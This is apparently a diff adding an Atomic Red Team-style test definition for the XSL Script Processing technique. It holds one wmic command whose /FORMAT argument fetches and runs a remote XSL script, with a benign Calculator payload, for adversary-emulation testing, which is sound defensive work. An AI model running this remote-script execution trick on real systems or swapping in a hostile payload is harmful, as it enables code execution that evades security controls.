@@ -1,0 +1,8 @@
+#TechniqueName: XSL Script Processing
+#AtomicTestName: WMIC bypass using remote XSL file
+#Description: Executes the code specified within a XSL script using a remote payload. Open Calculator.exe when test sucessfully executed, while AV turned off.&
+#Language: cmd
+
+#commands
+wmic process list /FORMAT:"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"
+
